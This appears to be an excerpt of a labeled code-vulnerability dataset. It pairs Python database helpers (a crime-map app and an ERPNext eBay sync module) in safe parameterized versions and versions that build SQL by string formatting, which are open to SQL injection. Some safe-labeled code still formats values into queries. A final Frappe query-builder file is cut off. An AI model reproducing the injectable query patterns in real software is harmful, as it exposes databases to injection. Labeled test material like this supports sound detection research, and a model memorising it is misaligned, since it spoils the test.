,Unnamed: 0,id,code,label
92,92,5cb70a7a64d77955a702657a27a23cfc845007a6,"crimemap/dbhelper.py/n/nimport pymysql
import dbconfig

class DBHelper:
    def connect(self, database=""crimemap""):
        return pymysql.connect(host='localhost',
                               user=dbconfig.db_user,
                               passwd=dbconfig.db_password,
                               db=database)

    def get_all_inputs(self):
        connection=self.connect()
        try:
            query=""SELECT description FROM crimes;""
            with connection.cursor() as cursor:
                cursor.execute(query)
            return cursor.fetchall()
        finally:
            connection.close()

    def add_input(self, data):
        connection=self.connect()
        try:
            # seems the query could only execute one sql a time
            query=""INSERT INTO crimes (description) VALUES (%s);""
            with connection.cursor() as cursor:
                cursor.execute(query, data)
                connection.commit()
        finally:
            connection.close()

    def clear_all(self):
        connection=self.connect()
        try:
            query=""DELETE FROM crimes;""
            with connection.cursor() as cursor:
                cursor.execute(query)
                connection.commit()
        finally:
            connection.close()


/n/n/n",0
93,93,5cb70a7a64d77955a702657a27a23cfc845007a6,"/crimemap/dbhelper.py/n/nimport pymysql
import dbconfig

class DBHelper:
    def connect(self, database=""crimemap""):
        return pymysql.connect(host='localhost',
                               user=dbconfig.db_user,
                               passwd=dbconfig.db_password,
                               db=database)

    def get_all_inputs(self):
        connection=self.connect()
        try:
            query=""SELECT description FROM crimes;""
            with connection.cursor() as cursor:
                cursor.execute(query)
            return cursor.fetchall()
        finally:
            connection.close()

    def add_input(self, data):
        connection=self.connect()
        try:
            query=""INSERT INTO crimes (description) VALUES ('{}');"".format(data)
            with connection.cursor() as cursor:
                cursor.execute(query)
                connection.commit()
        finally:
            connection.close()

    def clear_all(self):
        connection=self.connect()
        try:
            query=""DELETE FROM crimes;""
            with connection.cursor() as cursor:
                cursor.execute(query)
                connection.commit()
        finally:
            connection.close()


/n/n/n",1
180,180,090e492d02ed75ff8b39c9460a105da1c0b221e9,"erpnext_ebay/ebay_active_listings.py/n/n""""""ebay active listings
run from: premium report, garagsale_xml
""""""

from __future__ import unicode_literals
from __future__ import print_function
import __builtin__ as builtins


import sys
import os.path
import datetime
from datetime import date
from types import MethodType
import string

import frappe
from frappe import msgprint
#from frappe.utils import cstr

sys.path.insert(0, ""/Users/ben/dev/ebaysdk-python/dist/ebaysdk-2.1.5-py2.7.egg"")
sys.path.insert(0, ""/usr/local/lib/python2.7/dist-packages/ebaysdk-2.1.4-py2.7.egg"")
sys.path.insert(0, ""/usr/local/lib/python2.7/dist-packages/lxml-3.6.4-py2.7-linux-i686.egg"")

from ebaysdk.exception import ConnectionError
from ebaysdk.trading import Connection as Trading

sys.path.insert(0, frappe.get_app_path('unigreenscheme'))
PATH_TO_YAML = os.path.join(
    os.sep, frappe.utils.get_bench_path(), 'sites', frappe.get_site_path(), 'ebay.yaml')


def update_sold_statusDONOTUSE():
    sql = """"""
    DONT DO THIS UNLESS ABSOLUTELT SURE ABOUT QTY BETTER TO DO VIA IMPORT???????
    update set it.workflow_state = 'Sold'

    select it.item_code, bin.actual_qty
    from `tabItem` it
    right join `tabBin` bin
    on bin.item_code = it.item_code

    right join `zEbayListings` el
    on el.sku = it.item_code
    where el.qty =0 and bin.actual_qty =0
    """"""


@frappe.whitelist()
def generate_active_ebay_data():
    """"""Get all the active eBay listings and save them to table""""""

    # set up the zEbayListings table
    create_ebay_listings_table()

    page = 1
    listings_dict = get_myebay_selling_request(page)
    pages = int(listings_dict['ActiveList']['PaginationResult']['TotalNumberOfPages'])
    #timestamp = listings_dict['Timestamp']

    while pages >= page:

        for item in listings_dict['ActiveList']['ItemArray']['Item']:
            ebay_id = item['ItemID']
            qty = int(item['QuantityAvailable'])
            sku = item.get('SKU', '')
            #price = item['BuyItNowPrice']['value']
            #THSI IS 0        print(item['BuyItNowPrice']['value'])
            #Example: {'_currencyID': 'USD', 'value': '0.0'}   print(item['BuyItNowPrice'])
            curr_ebay_price = float(item['SellingStatus']['CurrentPrice']['value'])
            curr_ex_vat = curr_ebay_price / 1.2  # TODO VAT RATE
            #currency = item['SellingStatus']['CurrentPrice']['_currencyID']  # or ['Currency']
            #converted_price = item['ListingDetails]['ConvertedBuyItNowPrice']['value']
            #description = item['Description']
            hit_count = 0  # int(item['HitCount'])
            watch_count = 0  # int(item['WatchCount'])
            question_count = 0  # int(item['TotalQuestionCount'])
            #title = item['Title']
            #conv_title = title.encode('ascii', 'ignore').decode('ascii')
            #new_title = MySQLdb.escape_string(conv_title)
            site = ''
            insert_ebay_listing(
                sku, ebay_id, qty, curr_ebay_price, site, hit_count, watch_count, question_count)

        page += 1
        if pages >= page:
            listings_dict = get_myebay_selling_request(page)
        else:
            break


def get_myebay_selling_request(page):
    """"""get_myebay_selling_request""""""
    try:
        api_trading = Trading(config_file=PATH_TO_YAML, warnings=True, timeout=20)

        api_request = {
            ""ActiveList"": {
                ""Include"": True,
                ""Pagination"": {
                    ""EntriesPerPage"": 100,
                    ""PageNumber"": page
                    },
                ""IncludeWatchCount"": True
                },
            'DetailLevel': 'ReturnAll'
            }

        api_trading.execute('GetMyeBaySelling', api_request)
        products = api_trading.response.dict()

    except ConnectionError as e:
        print(e)
        print(e.response.dict())
        raise e

    return products


def create_ebay_listings_table():
    """"""Set up the zEbayListings temp table""""""

    sql = """"""
        create table if not exists `zEbayListings` (
        `sku` varchar(20),
        `ebay_id` varchar(38),
        `qty` integer,
        `price` decimal(18,6),
        `site` varchar(6),
        `hit_count` integer,
        `watch_count` integer,
        `question_count` integer
        );
    """"""

    frappe.db.sql(sql, auto_commit=True)

    sql2 = """"""truncate table `zEbayListings`;""""""

    frappe.db.sql(sql2, auto_commit=True)


def insert_ebay_listing(sku, ebay_id, qty, price,
                        site, hits, watches, questions):
    """"""insert ebay listings into a temp table""""""

    sql = """"""
        INSERT INTO `zEbayListings`
            VALUES (%s, %s, %s, %s, %s, %s, %s, %s);
        """"""
    parameters = (sku, ebay_id, qty, price, site, hits, watches, questions)

    frappe.db.sql(sql, parameters, auto_commit=True)


# *********************************************
# ***********  EBAY ID SYNCING CODE ***********
# *********************************************


# if item is on ebay then set the ebay_id field
def set_item_ebay_id(item_code, ebay_id):
    """"""Given an item_code set the ebay_id field to the live eBay ID
    also does not overwrite Awaiting Garagesale if ebay_id is blank
    """"""
    if ebay_id == '':
        sql = """"""update `tabItem` it
            set it.ebay_id = '{}'
            where it.item_code = '{}' 
            and it.ebay_id <> '{}'
            """""".format(ebay_id, item_code, 'Awaiting Garagesale')
    else:
        sql = """"""update `tabItem` it
            set it.ebay_id = '{}'
            where it.item_code = '{}' 
            """""".format(ebay_id, item_code)

    try:
        frappe.db.sql(sql, auto_commit=True)

    except Exception as inst:
        print(""Unexpected error running ebay_id sync."", item_code)
        raise

    return True


@frappe.whitelist()
def set_item_ebay_first_listed_date():
    """"""
    Given an ebay_id set the first listed on date.
    
    select it.item_code from `tabItem` it
    where it.on_sale_from_date is NULL
    and it.ebay_id REGEXP '^[0-9]+$';
    """"""

    date_today = date.today()

    sql = """"""
        UPDATE `tabItem` it
            SET it.on_sale_from_date = %s
            WHERE it.on_sale_from_date is NULL
                AND it.ebay_id REGEXP '^[0-9]+$';
    """"""

    try:
        frappe.db.sql(sql, (date_today.isoformat()), auto_commit=True)

    except Exception as inst:
        print(""Unexpected error setting first listed date."")
        raise


def sync_ebay_ids():
    """"""Return only items that don't match""""""

    sql = """"""
    select * from (
        SELECT t1.sku, t2.item_code, ifnull(t1.ebay_id, '') as live_ebay_id,
        ifnull(t2.ebay_id, '') as dead_ebay_id FROM `zEbayListings` t1
        LEFT JOIN `tabItem` t2 ON t1.sku = t2.item_code
        UNION
        SELECT t1.sku, t2.item_code, ifnull(t1.ebay_id, '') as live_ebay_id,
        ifnull(t2.ebay_id, '') as dead_ebay_id FROM `zEbayListings` t1
        RIGHT JOIN `tabItem` t2 ON t1.sku = t2.item_code
    ) as t
    where t.live_ebay_id <> t.dead_ebay_id
    """"""

    records = frappe.db.sql(sql, as_dict=True)

    for r in records:

        # If not live id then clear any value on system (unless Awaiting Garagaesale)
        if r.live_ebay_id == '':
            set_item_ebay_id(r.item_code, '')
        else:
            # ok so item is live but id's don't match so update system with live version
            if r.item_code:
                set_item_ebay_id(r.sku, r.live_ebay_id)
            else:
                msgprint(
                    'The ebay item cannot be found on ERPNEXT so unable to record ebay id',
                    r.live_ebay_id)
/n/n/n",0
181,181,090e492d02ed75ff8b39c9460a105da1c0b221e9,"/erpnext_ebay/ebay_active_listings.py/n/n""""""ebay active listings
run from: premium report, garagsale_xml
""""""

from __future__ import unicode_literals
from __future__ import print_function
import __builtin__ as builtins


import sys
import os.path
import datetime
from datetime import date
from types import MethodType
import string

import frappe
from frappe import msgprint
#from frappe.utils import cstr

sys.path.insert(0, ""/Users/ben/dev/ebaysdk-python/dist/ebaysdk-2.1.5-py2.7.egg"")
sys.path.insert(0, ""/usr/local/lib/python2.7/dist-packages/ebaysdk-2.1.4-py2.7.egg"")
sys.path.insert(0, ""/usr/local/lib/python2.7/dist-packages/lxml-3.6.4-py2.7-linux-i686.egg"")

from ebaysdk.exception import ConnectionError
from ebaysdk.trading import Connection as Trading
import ugssettings

sys.path.insert(0, frappe.get_app_path('unigreenscheme'))
PATH_TO_YAML = os.path.join(
    os.sep, frappe.utils.get_bench_path(), 'sites', frappe.get_site_path(), 'ebay.yaml')



def update_sold_statusDONOTUSE():
    
    sql = """"""
    DONT DO THIS UNLESS ABSOLUTELT SURE ABOUT QTY BETTER TO DO VIA IMPORT???????
    update set it.workflow_state = 'Sold'

    select it.item_code, bin.actual_qty
    from `tabItem` it
    right join `tabBin` bin
    on bin.item_code = it.item_code

    right join `zEbayListings` el
    on el.sku = it.item_code
    where el.qty =0 and bin.actual_qty =0
    """"""


@frappe.whitelist()
def generate_active_ebay_data():
    """"""Get all the active eBay listings and save them to table""""""

    # set up the zEbayListings table
    create_ebay_listings_table()

    page = 1
    listings_dict = get_myebay_selling_request(page)
    pages = int(listings_dict['ActiveList']['PaginationResult']['TotalNumberOfPages'])
    #timestamp = listings_dict['Timestamp']

    while pages >= page:

        for item in listings_dict['ActiveList']['ItemArray']['Item']:
            ebay_id = item['ItemID']
            qty = int(item['QuantityAvailable'])
            try:
                sku = item['SKU']
            except:
                sku = ''
            #price = item['BuyItNowPrice']['value']
            #THSI IS 0        print(item['BuyItNowPrice']['value'])
            #Example: {'_currencyID': 'USD', 'value': '0.0'}   print(item['BuyItNowPrice'])
            curr_ebay_price = float(item['SellingStatus']['CurrentPrice']['value'])
            curr_ex_vat = curr_ebay_price / ugssettings.VAT
            #currency = item['SellingStatus']['CurrentPrice']['_currencyID']  # or ['Currency']
            #converted_price = item['ListingDetails]['ConvertedBuyItNowPrice']['value']
            #description = item['Description']
            hit_count = 0 #int(item['HitCount'])
            watch_count = 0 #int(item['WatchCount'])
            question_count = 0 # int(item['TotalQuestionCount'])
            #title = item['Title']
            #conv_title = title.encode('ascii', 'ignore').decode('ascii')
            #new_title = MySQLdb.escape_string(conv_title)
            site = ''
            insert_ebay_listing(
                sku, ebay_id, qty, curr_ebay_price, site, hit_count, watch_count, question_count)

        page += 1
        if pages >= page:
            listings_dict = get_myebay_selling_request(page)
        else:
            break




def get_myebay_selling_request(page):
    """"""get_myebay_selling_request""""""
    try:
        api_trading = Trading(config_file=PATH_TO_YAML, warnings=True, timeout=20)

        api_request = {
            ""ActiveList"":{
                ""Include"": True,
                ""Pagination"": {
                    ""EntriesPerPage"": 100,
                    ""PageNumber"": page
                    },
                ""IncludeWatchCount"": True
            },
            'DetailLevel': 'ReturnAll'
        }

        api_trading.execute('GetMyeBaySelling', api_request)
        products = api_trading.response.dict()


    except ConnectionError as e:
        print(e)
        print(e.response.dict())
        raise e

    return products







def create_ebay_listings_table():
    """"""Set up the zEbayListings temp table""""""

    sql = """"""
        create table if not exists `zEbayListings` (
        `sku` varchar(20),
        `ebay_id` varchar(38),
        `qty` integer,
        `price` decimal(18,6),
        `site` varchar(6),
        `hit_count` integer,
        `watch_count` integer,
        `question_count` integer
        )
    """"""

    frappe.db.sql(sql, auto_commit=True)

    sql2 = """"""truncate table `zEbayListings` """"""

    frappe.db.sql(sql2, auto_commit=True)


def insert_ebay_listing(sku, ebay_id, qty, price,
                        site, hits, watches, questions):
    """"""insert ebay listings into a temp table""""""

    sql = """"""
    insert into `zEbayListings`
    values('{sku}', '{ebay_id}', {qty}, {price}, '{site}', {hit_count}, {watch_count}, {question_count})
    """""".format(sku=sku, ebay_id=ebay_id, qty=qty, price=price, site=site,
               hit_count=hits, watch_count=watches, question_count=questions)


    frappe.db.sql(sql, auto_commit=True)







##########  EBAY ID SYNCING CODE ############
##########  EBAY ID SYNCING CODE ############
##########  EBAY ID SYNCING CODE ############
##########  EBAY ID SYNCING CODE ############
##########  EBAY ID SYNCING CODE ############


# if item is on ebay then set the ebay_id field
def set_item_ebay_id(item_code, ebay_id):
    """"""Given an item_code set the ebay_id field to the live eBay ID
    also does not overwrite Awaiting Garagesale if ebay_id is blank
    """"""
    if ebay_id == '':
        sql = """"""update `tabItem` it
            set it.ebay_id = '{}'
            where it.item_code = '{}' 
            and it.ebay_id <> '{}'
            """""".format(ebay_id, item_code, 'Awaiting Garagesale')
    else:
        sql = """"""update `tabItem` it
            set it.ebay_id = '{}'
            where it.item_code = '{}' 
            """""".format(ebay_id, item_code)

    try:
        frappe.db.sql(sql, auto_commit=True)


    except Exception as inst:
        print(""Unexpected error running ebay_id sync."", item_code)
        raise

    return True



@frappe.whitelist()
def set_item_ebay_first_listed_date():
    """"""
    Given an ebay_id set the first listed on date.
    
    select it.item_code from `tabItem` it
    where it.on_sale_from_date is NULL
    and it.ebay_id REGEXP '^[0-9]+$';
    """"""

    date_today = date.today()

    sql = """"""
    update `tabItem` it
    set it.on_sale_from_date = '%s'
    where it.on_sale_from_date is NULL
    and it.ebay_id REGEXP '^[0-9]+$';
    """"""%date_today.isoformat()

    try:
        frappe.db.sql(sql, auto_commit=True)

    except Exception as inst:
        print(""Unexpected error setting first listed date."")
        raise


def sync_ebay_ids():
    """"""Return only items that don't match""""""

    sql = """"""
    select * from (
        SELECT t1.sku, t2.item_code, ifnull(t1.ebay_id, '') as live_ebay_id,
        ifnull(t2.ebay_id, '') as dead_ebay_id FROM `zEbayListings` t1
        LEFT JOIN `tabItem` t2 ON t1.sku = t2.item_code
        UNION
        SELECT t1.sku, t2.item_code, ifnull(t1.ebay_id, '') as live_ebay_id,
        ifnull(t2.ebay_id, '') as dead_ebay_id FROM `zEbayListings` t1
        RIGHT JOIN `tabItem` t2 ON t1.sku = t2.item_code
    ) as t
    where t.live_ebay_id <> t.dead_ebay_id
    """"""

    records = frappe.db.sql(sql, as_dict=True)


    for r in records:

        # If not live id then clear any value on system (unless Awaiting Garagaesale)
        if r.live_ebay_id == '':
            set_item_ebay_id(r.item_code, '')
        else:
            # ok so item is live but id's don't match so update system with live version
            if r.item_code:
                set_item_ebay_id(r.sku, r.live_ebay_id)

            else:
                msgprint(
                    'The ebay item cannot be found on ERPNEXT so unable to record ebay id', r.live_ebay_id)
/n/n/n",1
34,34,049d51cdf17b06168b4fe7672be8ce01fff0edd2,"frappe/model/db_query.py/n/n# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt

from __future__ import unicode_literals
""""""build query for doclistview and return results""""""

import frappe, json, copy
import frappe.defaults
import frappe.share
import frappe.permissions
from frappe.utils import flt, cint, getdate, get_datetime, get_time, make_filter_tuple, get_filter, add_to_date
from frappe import _
from frappe.model import optional_fields
from frappe.model.utils.list_settings import get_list_settings, update_list_settings

class DatabaseQuery(object):
	def __init__(self, doctype):
		self.doctype = doctype
		self.tables = []
		self.conditions = []
		self.or_conditions = []
		self.fields = None
		self.user = None
		self.ignore_ifnull = False
		self.flags = frappe._dict()

	def execute(self, query=None, fields=None, filters=None, or_filters=None,
		docstatus=None, group_by=None, order_by=None, limit_start=False,
		limit_page_length=None, as_list=False, with_childnames=False, debug=False,
		ignore_permissions=False, user=None, with_comment_count=False,
		join='left join', distinct=False, start=None, page_length=None, limit=None,
		ignore_ifnull=False, save_list_settings=False, save_list_settings_fields=False,
		update=None, add_total_row=None):
		if not ignore_permissions and not frappe.has_permission(self.doctype, ""read"", user=user):
			raise frappe.PermissionError, self.doctype

		# fitlers and fields swappable
		# its hard to remember what comes first
		if (isinstance(fields, dict)
			or (isinstance(fields, list) and fields and isinstance(fields[0], list))):
			# if fields is given as dict/list of list, its probably filters
			filters, fields = fields, filters

		elif fields and isinstance(filters, list) \
			and len(filters) > 1 and isinstance(filters[0], basestring):
			# if `filters` is a list of strings, its probably fields
			filters, fields = fields, filters

		if fields:
			self.fields = fields
		else:
			self.fields =  [""`tab{0}`.`name`"".format(self.doctype)]

		if start: limit_start = start
		if page_length: limit_page_length = page_length
		if limit: limit_page_length = limit

		self.filters = filters or []
		self.or_filters = or_filters or []
		self.docstatus = docstatus or []
		self.group_by = group_by
		self.order_by = order_by
		self.limit_start = 0 if (limit_start is False) else cint(limit_start)
		self.limit_page_length = cint(limit_page_length) if limit_page_length else None
		self.with_childnames = with_childnames
		self.debug = debug
		self.join = join
		self.distinct = distinct
		self.as_list = as_list
		self.ignore_ifnull = ignore_ifnull
		self.flags.ignore_permissions = ignore_permissions
		self.user = user or frappe.session.user
		self.update = update
		self.list_settings_fields = copy.deepcopy(self.fields)
		#self.debug = True

		if query:
			result = self.run_custom_query(query)
		else:
			result = self.build_and_run()

		if with_comment_count and not as_list and self.doctype:
			self.add_comment_count(result)

		if save_list_settings:
			self.save_list_settings_fields = save_list_settings_fields
			self.update_list_settings()

		return result

	def build_and_run(self):
		args = self.prepare_args()
		args.limit = self.add_limit()

		if args.conditions:
			args.conditions = ""where "" + args.conditions

		if self.distinct:
			args.fields = 'distinct ' + args.fields

		query = """"""select %(fields)s from %(tables)s %(conditions)s
			%(group_by)s %(order_by)s %(limit)s"""""" % args

		return frappe.db.sql(query, as_dict=not self.as_list, debug=self.debug, update=self.update)

	def prepare_args(self):
		self.parse_args()
		self.extract_tables()
		self.set_optional_columns()
		self.build_conditions()

		args = frappe._dict()

		if self.with_childnames:
			for t in self.tables:
				if t != ""`tab"" + self.doctype + ""`"":
					self.fields.append(t + "".name as '%s:name'"" % t[4:-1])

		# query dict
		args.tables = self.tables[0]

		# left join parent, child tables
		for child in self.tables[1:]:
			args.tables += "" {join} {child} on ({child}.parent = {main}.name)"".format(join=self.join,
				child=child, main=self.tables[0])

		if self.grouped_or_conditions:
			self.conditions.append(""({0})"".format("" or "".join(self.grouped_or_conditions)))

		args.conditions = ' and '.join(self.conditions)

		if self.or_conditions:
			args.conditions += (' or ' if args.conditions else """") + \
				 ' or '.join(self.or_conditions)

		self.set_field_tables()

		args.fields = ', '.join(self.fields)
		meta = frappe.get_meta(self.doctype)
		self.set_order_by(args, meta)
		self.validate_order_by_and_group_by_params(args.order_by, meta)
		args.order_by = args.order_by and ("" order by "" + args.order_by) or """"

		self.validate_order_by_and_group_by_params(self.group_by, meta)
		args.group_by = self.group_by and ("" group by "" + self.group_by) or """"

		return args

	def parse_args(self):
		""""""Convert fields and filters from strings to list, dicts""""""
		if isinstance(self.fields, basestring):
			if self.fields == ""*"":
				self.fields = [""*""]
			else:
				try:
					self.fields = json.loads(self.fields)
				except ValueError:
					self.fields = [f.strip() for f in self.fields.split("","")]

		for filter_name in [""filters"", ""or_filters""]:
			filters = getattr(self, filter_name)
			if isinstance(filters, basestring):
				filters = json.loads(filters)

			if isinstance(filters, dict):
				fdict = filters
				filters = []
				for key, value in fdict.iteritems():
					filters.append(make_filter_tuple(self.doctype, key, value))
			setattr(self, filter_name, filters)

	def extract_tables(self):
		""""""extract tables from fields""""""
		self.tables = ['`tab' + self.doctype + '`']

		# add tables from fields
		if self.fields:
			for f in self.fields:
				if ( not (""tab"" in f and ""."" in f) ) or (""locate("" in f): continue


				table_name = f.split('.')[0]
				if table_name.lower().startswith('group_concat('):
					table_name = table_name[13:]
				if table_name.lower().startswith('ifnull('):
					table_name = table_name[7:]
				if not table_name[0]=='`':
					table_name = '`' + table_name + '`'
				if not table_name in self.tables:
					self.append_table(table_name)

	def append_table(self, table_name):
		self.tables.append(table_name)
		doctype = table_name[4:-1]
		if (not self.flags.ignore_permissions) and (not frappe.has_permission(doctype)):
			raise frappe.PermissionError, doctype

	def set_field_tables(self):
		'''If there are more than one table, the fieldname must not be ambigous.
		If the fieldname is not explicitly mentioned, set the default table'''
		if len(self.tables) > 1:
			for i, f in enumerate(self.fields):
				if '.' not in f:
					self.fields[i] = '{0}.{1}'.format(self.tables[0], f)

	def set_optional_columns(self):
		""""""Removes optional columns like `_user_tags`, `_comments` etc. if not in table""""""
		columns = frappe.db.get_table_columns(self.doctype)

		# remove from fields
		to_remove = []
		for fld in self.fields:
			for f in optional_fields:
				if f in fld and not f in columns:
					to_remove.append(fld)

		for fld in to_remove:
			del self.fields[self.fields.index(fld)]

		# remove from filters
		to_remove = []
		for each in self.filters:
			if isinstance(each, basestring):
				each = [each]

			for element in each:
				if element in optional_fields and element not in columns:
					to_remove.append(each)

		for each in to_remove:
			if isinstance(self.filters, dict):
				del self.filters[each]
			else:
				self.filters.remove(each)

	def build_conditions(self):
		self.conditions = []
		self.grouped_or_conditions = []
		self.build_filter_conditions(self.filters, self.conditions)
		self.build_filter_conditions(self.or_filters, self.grouped_or_conditions)

		# match conditions
		if not self.flags.ignore_permissions:
			match_conditions = self.build_match_conditions()
			if match_conditions:
				self.conditions.append(""("" + match_conditions + "")"")

	def build_filter_conditions(self, filters, conditions):
		""""""build conditions from user filters""""""
		if isinstance(filters, dict):
			filters = [filters]

		for f in filters:
			if isinstance(f, basestring):
				conditions.append(f)
			else:
				conditions.append(self.prepare_filter_condition(f))

	def prepare_filter_condition(self, f):
		""""""Returns a filter condition in the format:

				ifnull(`tabDocType`.`fieldname`, fallback) operator ""value""
		""""""

		f = get_filter(self.doctype, f)

		tname = ('`tab' + f.doctype + '`')
		if not tname in self.tables:
			self.append_table(tname)

		if 'ifnull(' in f.fieldname:
			column_name = f.fieldname
		else:
			column_name = '{tname}.{fname}'.format(tname=tname,
				fname=f.fieldname)

		can_be_null = True

		# prepare in condition
		if f.operator in ('in', 'not in'):
			values = f.value
			if not isinstance(values, (list, tuple)):
				values = values.split("","")

			fallback = ""''""
			value = (frappe.db.escape((v or '').strip(), percent=False) for v in values)
			value = '(""{0}"")'.format('"", ""'.join(value))
		else:
			df = frappe.get_meta(f.doctype).get(""fields"", {""fieldname"": f.fieldname})
			df = df[0] if df else None

			if df and df.fieldtype in (""Check"", ""Float"", ""Int"", ""Currency"", ""Percent""):
				can_be_null = False

			if f.operator=='Between' and \
				(f.fieldname in ('creation', 'modified') or (df and (df.fieldtype==""Date"" or df.fieldtype==""Datetime""))):
				value = ""'%s' AND '%s'"" % (
					get_datetime(f.value[0]).strftime(""%Y-%m-%d %H:%M:%S.%f""),
					add_to_date(get_datetime(f.value[1]),days=1).strftime(""%Y-%m-%d %H:%M:%S.%f""))
				fallback = ""'0000-00-00 00:00:00'""
			elif df and df.fieldtype==""Date"":
				value = getdate(f.value).strftime(""%Y-%m-%d"")
				fallback = ""'0000-00-00'""

			elif df and df.fieldtype==""Datetime"":
				value = get_datetime(f.value).strftime(""%Y-%m-%d %H:%M:%S.%f"")
				fallback = ""'0000-00-00 00:00:00'""

			elif df and df.fieldtype==""Time"":
				value = get_time(f.value).strftime(""%H:%M:%S.%f"")
				fallback = ""'00:00:00'""

			elif f.operator in (""like"", ""not like"") or (isinstance(f.value, basestring) and
				(not df or df.fieldtype not in [""Float"", ""Int"", ""Currency"", ""Percent"", ""Check""])):
					value = """" if f.value==None else f.value
					fallback = '""""'

					if f.operator in (""like"", ""not like"") and isinstance(value, basestring):
						# because ""like"" uses backslash (\) for escaping
						value = value.replace(""\\"", ""\\\\"").replace(""%"", ""%%"")

			else:
				value = flt(f.value)
				fallback = 0

			# put it inside double quotes
			if isinstance(value, basestring) and not f.operator=='Between':
				value = '""{0}""'.format(frappe.db.escape(value, percent=False))

		if (self.ignore_ifnull
			or not can_be_null
			or (f.value and f.operator in ('=', 'like'))
			or 'ifnull(' in column_name.lower()):
			condition = '{column_name} {operator} {value}'.format(
				column_name=column_name, operator=f.operator,
				value=value)
		else:
			condition = 'ifnull({column_name}, {fallback}) {operator} {value}'.format(
				column_name=column_name, fallback=fallback, operator=f.operator,
				value=value)

		return condition

	def build_match_conditions(self, as_condition=True):
		""""""add match conditions if applicable""""""
		self.match_filters = []
		self.match_conditions = []
		only_if_shared = False
		if not self.user:
			self.user = frappe.session.user

		if not self.tables: self.extract_tables()

		meta = frappe.get_meta(self.doctype)
		role_permissions = frappe.permissions.get_role_permissions(meta, user=self.user)

		self.shared = frappe.share.get_shared(self.doctype, self.user)

		if not meta.istable and not role_permissions.get(""read"") and not self.flags.ignore_permissions:
			only_if_shared = True
			if not self.shared:
				frappe.throw(_(""No permission to read {0}"").format(self.doctype), frappe.PermissionError)
			else:
				self.conditions.append(self.get_share_condition())

		else:
			# apply user permissions?
			if role_permissions.get(""apply_user_permissions"", {}).get(""read""):
				# get user permissions
				user_permissions = frappe.defaults.get_user_permissions(self.user)
				self.add_user_permissions(user_permissions,
					user_permission_doctypes=role_permissions.get(""user_permission_doctypes"").get(""read""))

			if role_permissions.get(""if_owner"", {}).get(""read""):
				self.match_conditions.append(""`tab{0}`.owner = '{1}'"".format(self.doctype,
					frappe.db.escape(self.user, percent=False)))

		if as_condition:
			conditions = """"
			if self.match_conditions:
				# will turn out like ((blog_post in (..) and blogger in (...)) or (blog_category in (...)))
				conditions = ""(("" + "") or ("".join(self.match_conditions) + ""))""

			doctype_conditions = self.get_permission_query_conditions()
			if doctype_conditions:
				conditions += (' and ' + doctype_conditions) if conditions else doctype_conditions

			# share is an OR condition, if there is a role permission
			if not only_if_shared and self.shared and conditions:
				conditions =  ""({conditions}) or ({shared_condition})"".format(
					conditions=conditions, shared_condition=self.get_share_condition())

			return conditions

		else:
			return self.match_filters

	def get_share_condition(self):
		return """"""`tab{0}`.name in ({1})"""""".format(self.doctype, "", "".join([""'%s'""] * len(self.shared))) % \
			tuple([frappe.db.escape(s, percent=False) for s in self.shared])

	def add_user_permissions(self, user_permissions, user_permission_doctypes=None):
		user_permission_doctypes = frappe.permissions.get_user_permission_doctypes(user_permission_doctypes, user_permissions)
		meta = frappe.get_meta(self.doctype)

		for doctypes in user_permission_doctypes:
			match_filters = {}
			match_conditions = []
			# check in links
			for df in meta.get_fields_to_check_permissions(doctypes):
				user_permission_values = user_permissions.get(df.options, [])

				condition = 'ifnull(`tab{doctype}`.`{fieldname}`, """")=""""'.format(doctype=self.doctype, fieldname=df.fieldname)
				if user_permission_values:
					condition += """""" or `tab{doctype}`.`{fieldname}` in ({values})"""""".format(
						doctype=self.doctype, fieldname=df.fieldname,
						values="", "".join([('""'+frappe.db.escape(v, percent=False)+'""') for v in user_permission_values])
					)
				match_conditions.append(""({condition})"".format(condition=condition))

				match_filters[df.options] = user_permission_values

			if match_conditions:
				self.match_conditions.append("" and "".join(match_conditions))

			if match_filters:
				self.match_filters.append(match_filters)

	def get_permission_query_conditions(self):
		condition_methods = frappe.get_hooks(""permission_query_conditions"", {}).get(self.doctype, [])
		if condition_methods:
			conditions = []
			for method in condition_methods:
				c = frappe.call(frappe.get_attr(method), self.user)
				if c:
					conditions.append(c)

			return "" and "".join(conditions) if conditions else None

	def run_custom_query(self, query):
		if '%(key)s' in query:
			query = query.replace('%(key)s', 'name')
		return frappe.db.sql(query, as_dict = (not self.as_list))

	def set_order_by(self, args, meta):
		if self.order_by:
			args.order_by = self.order_by
		else:
			args.order_by = """"

			# don't add order by from meta if a mysql group function is used without group by clause
			group_function_without_group_by = (len(self.fields)==1 and
				(	self.fields[0].lower().startswith(""count("")
					or self.fields[0].lower().startswith(""min("")
					or self.fields[0].lower().startswith(""max("")
				) and not self.group_by)

			if not group_function_without_group_by:
				sort_field = sort_order = None
				if meta.sort_field and ',' in meta.sort_field:
					# multiple sort given in doctype definition
					# Example:
					# `idx desc, modified desc`
					# will covert to
					# `tabItem`.`idx` desc, `tabItem`.`modified` desc
					args.order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(self.doctype,
						f.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])
				else:
					sort_field = meta.sort_field or 'modified'
					sort_order = (meta.sort_field and meta.sort_order) or 'desc'

					args.order_by = ""`tab{0}`.`{1}` {2}"".format(self.doctype, sort_field or ""modified"", sort_order or ""desc"")

				# draft docs always on top
				if meta.is_submittable:
					args.order_by = ""`tab{0}`.docstatus asc, {1}"".format(self.doctype, args.order_by)

	def validate_order_by_and_group_by_params(self, parameters, meta):
		""""""
			Clause cases:
				1. check for . to split table and columns and check for `tab prefix
				2. elif check field in meta
		""""""
		for field in parameters.split("",""):
			if ""."" in field and field.startswith(""`tab""):
				tbl = field.split('.')[0]
				if tbl not in self.tables:
					if tbl.startswith('`'):
						tbl = tbl[4:-1]
					frappe.throw(_(""Please select atleast 1 column from {0} to sort"").format(tbl))
			else:
				field = field.strip().split(' ')[0]
				if field not in [f.fieldname for f in meta.fields]:
					frappe.throw(_(""{0} invalid field in clause"").format(field))

	def add_limit(self):
		if self.limit_page_length:
			return 'limit %s, %s' % (self.limit_start, self.limit_page_length)
		else:
			return ''

	def add_comment_count(self, result):
		for r in result:
			if not r.name:
				continue

			r._comment_count = 0
			if ""_comments"" in r:
				r._comment_count = len(json.loads(r._comments or ""[]""))

	def update_list_settings(self):
		# update list settings if new search
		list_settings = json.loads(get_list_settings(self.doctype) or '{}')
		list_settings['filters'] = self.filters
		list_settings['limit'] = self.limit_page_length
		list_settings['order_by'] = self.order_by

		if self.save_list_settings_fields:
